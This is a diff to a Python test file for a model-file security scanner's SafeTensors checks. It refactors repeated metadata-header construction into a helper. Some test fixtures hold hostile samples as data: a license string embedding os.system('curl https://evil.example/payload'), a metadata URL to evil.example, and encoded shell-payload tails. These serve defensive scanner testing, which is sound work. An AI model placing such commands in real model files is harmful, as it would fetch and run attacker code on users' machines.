@@ -41,6 +41,7 @@ from modelaudit.scanners.safetensors_scanner import (
     SafeTensorsScanner,
     _safetensors_name_preview,
 )
+from tests.cache_lifecycle import IsolatedCacheManager
 
 CYRILLIC_SMALL_A = chr(0x0430)
 FULLWIDTH_PERCENT = chr(0xFF05)
@@ -65,6 +66,13 @@ def create_safetensors_with_dtype_size_mismatch(path: Path, dtype: str) -> None:
 def write_raw_safetensors(path: Path, header: dict[str, Any], data: bytes) -> None:
     header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
     path.write_bytes(struct.pack("<Q", len(header_bytes)) + header_bytes + data)
+
+
+def _metadata_header(metadata: Any) -> dict[str, Any]:
+    return {
+        "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+        "__metadata__": metadata,
+    }
 
 
 def write_raw_safetensors_header(path: Path, header_bytes: bytes, data: bytes = b"") -> None:
@@ -802,10 +810,7 @@ def test_valid_empty_safetensors_custom_metadata(tmp_path: Path) -> None:
     file_path = tmp_path / "empty_metadata.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {},
-        },
+        _metadata_header({}),
         b"\x00",
     )
 
@@ -826,10 +831,7 @@ def test_license_metadata_document_url_and_length_are_not_suspicious(tmp_path: P
     license_text = ordinary_license_text_with_url()
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": license_text},
-        },
+        _metadata_header({"license": license_text}),
         b"\x00",
     )
 
@@ -854,10 +856,7 @@ def test_license_metadata_ordinary_prose_without_url_stays_clean(tmp_path: Path)
     license_text = ordinary_license_text_without_url()
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": license_text},
-        },
+        _metadata_header({"license": license_text}),
         b"\x00",
     )
 
@@ -879,10 +878,7 @@ def test_license_metadata_long_ordinary_document_with_incidental_tokens_stays_cl
     license_text = long_ordinary_license_text_with_incidental_tokens()
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": license_text},
-        },
+        _metadata_header({"license": license_text}),
         b"\x00",
     )
 
@@ -919,10 +915,7 @@ def test_license_metadata_dmca_trusted_url_prose_stays_clean(tmp_path: Path) -> 
     license_text = f"{ordinary_license_text_with_url()}\n" + "\n".join(legal_lines)
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": license_text},
-        },
+        _metadata_header({"license": license_text}),
         b"\x00",
     )
 
@@ -1117,10 +1110,7 @@ def test_license_metadata_executable_content_is_not_suppressed(tmp_path: Path) -
     payload = ordinary_license_text_with_url() + "\nimport os\nos.system('curl https://evil.example/payload')"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1197,10 +1187,7 @@ def test_license_metadata_untrusted_url_is_not_suppressed(tmp_path: Path, url: s
     payload = ordinary_license_text_with_url() + f"\nAdditional terms: {url}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1232,10 +1219,7 @@ def test_license_metadata_short_trusted_url_is_not_suspicious(tmp_path: Path, ur
     file_path = tmp_path / "license_metadata_short_trusted_url.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": url},
-        },
+        _metadata_header({"license": url}),
         b"\x00",
     )
 
@@ -1263,10 +1247,7 @@ def test_metadata_raw_mixed_case_url_reports_s905(tmp_path: Path, key: str, url:
     file_path = tmp_path / "metadata_mixed_case_url.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {key: url},
-        },
+        _metadata_header({key: url}),
         b"\x00",
     )
 
@@ -1293,10 +1274,7 @@ def test_license_metadata_mixed_case_trusted_url_is_not_suspicious(tmp_path: Pat
     file_path = tmp_path / "license_metadata_mixed_case_trusted_url.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": url},
-        },
+        _metadata_header({"license": url}),
         b"\x00",
     )
 
@@ -1317,10 +1295,7 @@ def test_license_metadata_short_trusted_url_is_not_suspicious_in_nested_archive(
     archive_path = tmp_path / "bundle.zip"
     write_raw_safetensors(
         source_file,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": "https://opensource.org/licenses/MIT"},
-        },
+        _metadata_header({"license": "https://opensource.org/licenses/MIT"}),
         b"\x00",
     )
     with zipfile.ZipFile(archive_path, "w") as archive:
@@ -1340,10 +1315,7 @@ def test_license_metadata_padded_blob_keeps_length_check(tmp_path: Path) -> None
     payload = ordinary_license_text_with_url() + "\n" + ("A" * 5000)
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1364,10 +1336,7 @@ def test_license_metadata_wrapped_opaque_tail_keeps_length_check(tmp_path: Path)
     payload = ordinary_license_text_with_url() + "\n" + encoded_tail
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1387,10 +1356,7 @@ def test_license_metadata_standard_wrapped_base64_tail_keeps_length_and_s905(tmp
     payload = f"{ordinary_license_text_with_url()}\n{standard_wrapped_base64_tail(line_count=3)}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1419,10 +1385,7 @@ def test_long_license_metadata_wrapped_active_base64_tail_reports_wrapped_opaque
     payload = f"{license_text}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1457,10 +1420,7 @@ def test_long_license_metadata_annotated_wrapped_opaque_tail_reports_wrapped_opa
     payload = f"{license_text}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1497,10 +1457,7 @@ def test_long_license_metadata_verbose_annotated_wrapped_opaque_tail_reports_wra
     payload = f"{license_text}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1530,10 +1487,7 @@ def test_license_metadata_no_url_verbose_annotated_wrapped_opaque_tail_reports_w
     payload = f"{ordinary_license_text_without_url()}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1564,10 +1518,7 @@ def test_license_metadata_wrapped_opaque_tail_before_long_prose_reports_wrapped_
     payload = f"{ordinary_license_text_without_url()}\n{wrapped_tail}\n{documentary_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1596,10 +1547,7 @@ def test_license_metadata_wrapped_opaque_tail_before_large_prose_reports_wrapped
     payload = f"{ordinary_license_text_without_url()}\n{wrapped_tail}\n{documentary_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1625,10 +1573,7 @@ def test_license_metadata_url_bearing_wrapped_opaque_tail_reports_wrapped_opaque
     payload = f"{ordinary_license_text_with_url()}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1724,10 +1669,7 @@ def test_license_metadata_annotated_wrapped_base64_tail_keeps_length_and_s905(
     payload = f"{ordinary_license_text_with_url()}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1762,10 +1704,7 @@ def test_license_metadata_padded_short_import_gadget_base64_keeps_length_and_s90
     payload = f"{ordinary_license_text_with_url()}\n{padded_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1800,10 +1739,7 @@ def test_license_metadata_two_low_ratio_chunks_on_one_line_keep_length_and_s905(
     payload = f"{ordinary_license_text_with_url()}\n{tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1833,10 +1769,7 @@ def test_license_metadata_shell_payload_base64_keeps_length_and_s905(tmp_path: P
     payload = f"{ordinary_license_text_with_url()}\nLicense grant {short_shell_payload_base64_tail()} under terms"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1875,10 +1808,7 @@ def test_license_metadata_annotated_tiny_base64_chunks_keep_length_pattern_and_s
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1911,10 +1841,7 @@ def test_license_metadata_invalid_wrapped_base64_modulo_one_fails_closed(tmp_pat
     payload = f"{ordinary_license_text_with_url()}\n{invalid_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1944,10 +1871,7 @@ def test_license_metadata_invalid_modulo_one_tiny_chunks_fail_closed(
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -1980,10 +1904,7 @@ def test_license_metadata_invalid_modulo_one_tiny_prefix_suffix_chunks_fail_clos
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2007,10 +1928,7 @@ def test_license_metadata_unpadded_tiny_base64_chunks_reconstruct_active_payload
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2042,10 +1960,7 @@ def test_license_metadata_unpadded_tiny_prefix_suffix_chunks_reconstruct_active_
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2071,10 +1986,7 @@ def test_license_metadata_unpadded_tiny_chunks_ignore_documentary_short_words(
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2098,10 +2010,7 @@ def test_license_metadata_bare_tiny_chunks_between_documentary_prose_reconstruct
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2120,10 +2029,7 @@ def test_license_metadata_bare_short_documentary_lines_between_prose_stay_clean(
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_terms}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2146,10 +2052,7 @@ def test_license_metadata_word_like_chunk_with_extra_short_words_reconstructs_ac
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2169,10 +2072,7 @@ def test_license_metadata_unpadded_tiny_word_like_chunk_reconstructs_active_payl
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2190,10 +2090,7 @@ def test_license_metadata_repeated_short_documentary_words_stays_clean(tmp_path:
     payload = f"{ordinary_license_text_with_url()}\n{repeated_terms}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2211,10 +2108,7 @@ def test_license_metadata_short_documentary_words_with_trailing_separator_stays_
     payload = f"{ordinary_license_text_with_url()}\n{repeated_terms}\n{separator}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2231,10 +2125,7 @@ def test_license_metadata_documentary_heading_with_trailing_separator_stays_clea
     payload = f"{ordinary_license_text_with_url()}\nCopyright\n{separator}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2252,10 +2143,7 @@ def test_license_metadata_short_documentary_prefix_suffix_words_stay_clean(tmp_p
     payload = f"{ordinary_license_text_with_url()}\n{repeated_terms}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2275,10 +2163,7 @@ def test_license_metadata_separator_overflow_between_short_chunks_fails_closed(t
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2305,10 +2190,7 @@ def test_license_metadata_separator_overflow_between_four_char_chunks_fails_clos
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2340,10 +2222,7 @@ def test_license_metadata_unpadded_tiny_chunks_survive_separator_overflow(
     payload = f"{ordinary_license_text_with_url()}\n{wrapped_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2379,10 +2258,7 @@ def test_license_metadata_review_regressions_route_in_nested_archive(
     payload = f"{ordinary_license_text_with_url()}\n{payload_tail}"
     write_raw_safetensors(
         source_file,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
     with zipfile.ZipFile(archive_path, "w") as archive:
@@ -2416,10 +2292,7 @@ def test_license_metadata_encoded_backslash_url_delimiters_fail_closed(
     payload = f"{ordinary_license_text_with_url()}\n{payload_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2457,10 +2330,7 @@ def test_license_metadata_raw_backslash_url_delimiters_fail_closed(
     payload = f"{ordinary_license_text_with_url()}\n{payload_tail}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2496,10 +2366,7 @@ def test_license_metadata_short_encoded_backslash_url_delimiters_report_s905_wit
     payload = f"{ordinary_license_text_without_url()}\nEncoded reference: {encoded_url}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2539,10 +2406,7 @@ def test_license_metadata_short_raw_backslash_url_delimiters_report_s905_without
     payload = f"{ordinary_license_text_without_url()}\nReference: {backslash_url}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2579,10 +2443,7 @@ def test_license_metadata_short_entity_encoded_url_delimiters_report_s905_withou
     payload = f"{ordinary_license_text_without_url()}\nEncoded reference: {encoded_url}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2619,10 +2480,7 @@ def test_license_metadata_nested_entity_encoded_url_delimiter_fails_closed(
     payload = f"{ordinary_license_text_without_url()}\nEncoded reference: {encoded_url}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2654,10 +2512,7 @@ def test_license_metadata_short_bare_tiny_base64_chunks_report_s905_without_leng
     payload = "License agreement terms.\n" + chunk_separator.join(chunks)
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2710,10 +2565,7 @@ def test_license_metadata_trusted_url_with_unrelated_nested_entity_stays_clean(t
     )
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2733,10 +2585,7 @@ def test_license_metadata_percent_encoded_backslash_text_stays_clean(tmp_path: P
     )
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2816,10 +2665,7 @@ def test_license_metadata_oversized_wrapped_base64_tail_fails_closed(tmp_path: P
     )
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2850,10 +2696,7 @@ def test_license_metadata_five_layer_encoded_license_url_fails_closed(tmp_path: 
     payload = f"{ordinary_license_text_with_url()}\nAdditional terms: {url}"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
@@ -2874,10 +2717,7 @@ def test_deceptive_license_metadata_keys_do_not_get_license_context(tmp_path: Pa
     file_path = tmp_path / "deceptive_license_metadata.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {key: ordinary_license_text_with_url()},
-        },
+        _metadata_header({key: ordinary_license_text_with_url()}),
         b"\x00",
     )
 
@@ -2898,10 +2738,7 @@ def test_non_license_metadata_url_still_reports_s905(tmp_path: Path) -> None:
     file_path = tmp_path / "non_license_url_metadata.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"homepage": "https://evil.example/payload"},
-        },
+        _metadata_header({"homepage": "https://evil.example/payload"}),
         b"\x00",
     )
 
@@ -2921,10 +2758,7 @@ def test_malicious_long_non_license_metadata_still_reports_length(tmp_path: Path
     file_path = tmp_path / "long_payload_metadata.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"payload": "A" * 1001},
-        },
+        _metadata_header({"payload": "A" * 1001}),
         b"\x00",
     )
 
@@ -2949,10 +2783,7 @@ def test_malformed_safetensors_custom_metadata_is_inconclusive(tmp_path: Path, c
     file_path = tmp_path / "malformed_metadata.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": custom_metadata,
-        },
+        _metadata_header(custom_metadata),
         b"\x00",
     )
 
@@ -2995,10 +2826,7 @@ def test_malformed_safetensors_custom_metadata_still_reports_security_flags(
     file_path = tmp_path / "malformed_malicious_metadata.safetensors"
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": custom_metadata,
-        },
+        _metadata_header(custom_metadata),
         b"\x00",
     )
 
@@ -3511,13 +3339,10 @@ def test_zlib_shaped_deep_header_fails_closed(tmp_path: Path) -> None:
         "min_cache_file_size": 0,
     }
 
-    reset_cache_manager()
-    try:
+    with IsolatedCacheManager(lambda: reset_cache_manager()):
         result = scan_file(str(file_path), config=config)
         repeated_result = scan_file(str(file_path), config=config)
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
-    finally:
-        reset_cache_manager()
 
     aggregate = scan_model_directory_or_file(str(file_path), cache_scan_results=False)
 
@@ -3906,10 +3731,7 @@ def _assert_safetensors_invalid_header(tmp_path: Path, filename: str, header: by
 def _assert_license_backslash_text(file_path: Path, payload: str) -> None:
     write_raw_safetensors(
         file_path,
-        {
-            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
-            "__metadata__": {"license": payload},
-        },
+        _metadata_header({"license": payload}),
         b"\x00",
     )
 
